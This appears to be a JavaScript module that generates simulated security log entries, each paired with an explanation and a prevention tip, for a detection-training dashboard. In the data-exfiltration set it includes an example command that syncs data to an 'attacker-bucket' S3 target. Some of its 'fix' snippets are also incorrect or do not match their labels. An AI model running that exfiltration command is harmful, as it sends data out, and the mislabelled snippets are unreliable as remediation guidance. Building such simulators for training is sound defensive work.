/* ── High-Fidelity Simulation Log Engine with Intelligence ── */

const BASE_NOISE = [
  { 
    layer: 'network', 
    message: "Inbound connection on port 443 (HTTPS) - legitimate session",
    explanation: "Standard encrypted web traffic from an external client to the internal load balancer.",
    prevention: "Regularly audit SSL certificates and monitor for unusual traffic spikes.",
    code: "ufw allow 443/tcp"
  },
  { 
    layer: 'network', 
    message: "DNS resolution: internal-service.cluster.local -> 10.0.0.5",
    explanation: "Internal service discovery query within the Kubernetes/Docker subnet.",
    prevention: "Implement DNSSEC and restrict zonal transfers to authorized nodes.",
    code: "nslookup internal-service.cluster.local"
  },
  {
    layer: 'network',
    message: "Health check: LoadBalancer -> Node-04 success",
    explanation: "Routine infrastructure monitoring to ensure service availability.",
    prevention: "Ensure health check IPs are within a trusted internal range.",
    code: "curl -I http://10.0.0.4/health"
  }
];

const ATTACK_LOGS = {
  brute_force: [
    {
      message: "FAILED LOGIN: Invalid password for user 'root' from 10.0.0.99",
      explanation: "A high-risk attempt to gain superuser access using incorrect credentials. Repeated occurrences indicate an active brute-force scenario.",
      prevention: "Disable root login over SSH and implement Fail2Ban.",
      code: "PermitRootLogin no >> /etc/ssh/sshd_config"
    },
    {
      message: "Authentication failure: 20 attempts in 1.2s from same source",
      explanation: "Massive spike in failed authentication events. This matches known patterns of a high-velocity dictionary attack.",
      prevention: "Implement account lockout policies and rate-limiting at the firewall level.",
      code: "iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set"
    },
    {
       message: "SUCCESSFUL LOGIN: User 'ssh_user' (Session hijacked?)",
       explanation: "A successful login occurring after hundreds of failures. This is a critical indicator of a compromised account.",
       prevention: "Enforce Multi-Factor Authentication (MFA) and hardware tokens (YubiKey).",
       code: "pkill -u ssh_user && usermod -L ssh_user"
    }
  ],
  c2_beacon: [
    {
      message: "Anomaly: Periodic outbound heartbeat (30.0s) to 72.24.11.90",
      explanation: "Rhythmic egress traffic to an unknown IP. This is a signature of 'Beaconing', where malware checks in with a C2 server for instructions.",
      prevention: "Use Egress filtering to block traffic to non-whitelisted external IPs.",
      code: "iptables -A OUTPUT -d 72.24.11.90 -j DROP"
    },
    {
      message: "Deep Packet Inspection: Encrypted payload (200B) in HTTPS-443",
      explanation: "Small, encrypted data chunks being sent outbound within legitimate-looking HTTPS streams.",
      prevention: "Deploy SSL/TLS Inspection proxies to identify hidden malicious payloads.",
      code: "tcpdump -i eth0 dst 72.24.11.90"
    }
  ],
  lateral_movement: [
    {
      message: "LSASS.exe process memory targeted for illegal read access",
      explanation: "A process (often Mimikatz) attempted to dump the LSASS memory to steal unencrypted domain credentials.",
      prevention: "Enable 'RunAsPPL' for LSASS and restrict local administrative privileges.",
      code: "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1"
    },
    {
      message: "WMI: Remote process execution detected on Domain Controller",
      explanation: "The attacker is using Windows Management Instrumentation to execute commands remotely on the core identity server.",
      prevention: "Restrict WMI access to specific management workstations and monitor Event ID 4624.",
      code: "Get-WmiObject -Class Win32_Process -ComputerName DC-01"
    }
  ],
  data_exfiltration: [
    {
      message: "SQL: Bulk select query on 'customer_PII' table (12,000 rows)",
      explanation: "Massive read operation on sensitive database tables containing Personally Identifiable Information.",
      prevention: "Implement database activity monitoring (DAM) and row-level access controls.",
      code: "SELECT * FROM customer_PII LIMIT 0; -- REVOKE ACCESS"
    },
    {
      message: "Egress: Massive data volume moving to AWS-S3 (unauthorized)",
      explanation: "Large outbound transfer (150MB+) detected. The destination is an unauthorized cloud storage bucket.",
      prevention: "Implement Data Loss Prevention (DLP) to monitor and block bulk outbound transfers.",
      code: "aws s3 sync /data s3://attacker-bucket --dryrun"
    }
  ],
  demo: [
    {
      message: "Brute Force: Analyzing 500+ authentication failures on port 22",
      explanation: "Initial access attempt via high-velocity dictionary attack targeting administrative accounts.",
      prevention: "Enforce MFA and use certificate-based authentication for all high-value nodes.",
      code: "iptables -A INPUT -p tcp --dport 22 -j DROP"
    },
    {
      message: "Lateral Phase: Attempting credential capture from local SAM database",
      explanation: "Attacker is using internal discovery tools to extract password hashes from compromised workstations.",
      prevention: "Disable LLMNR/NBT-NS and enable LSA Protection on all endpoints.",
      code: "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /v RunAsPPL /t REG_DWORD /d 1"
    },
    {
      message: "C2 Established: Encrypted tunnel found on non-standard port 8080",
      explanation: "Persistence established. Malicious agent is communicating with a remote server via encoded payloads.",
      prevention: "Implement application-layer filtering to block anomalous outbound user-agents.",
      code: "netstat -ano | findstr 8080"
    },
    {
      message: "Exfiltration: Massive egress detected targeting Cloud bucket",
      explanation: "Stage 3 complete. Sensitive database archives are being moved out of the local network.",
      prevention: "Deploy Data Loss Prevention (DLP) monitors on all external gateways.",
      code: "route add 72.24.11.90 reject"
    },
    {
      message: "AI Engine: High-confidence correlation for Multi-Stage Chain (T1110 -> T1071 -> T1041)",
      explanation: "The system has successfully linked the entire attack lifecycle into a single high-priority incident.",
      prevention: "Implement automated remediation playbooks to isolate the entry-node instantly.",
      code: "ansible-playbook kill_session.yml"
    }
  ]
};

export const getRandomLog = (attackType, currentCount, threshold) => {
  const isAttack = currentCount > threshold;
  const timestamp = new Date().toISOString();
  
  if (!isAttack) {
    const msgObj = BASE_NOISE[Math.floor(Math.random() * BASE_NOISE.length)];
    return { timestamp, ...msgObj, logPhase: 'normal' };
  } else {
    const variantSet = ATTACK_LOGS[attackType] || ATTACK_LOGS['demo'];
    const msgIndex = Math.min(
      Math.floor((currentCount - threshold) / 2), 
      variantSet.length - 1
    );
    const msgObj = variantSet[msgIndex];
    return { timestamp, layer: attackType.includes('force') ? 'network' : 'endpoint', ...msgObj, logPhase: 'attack' };
  }
}
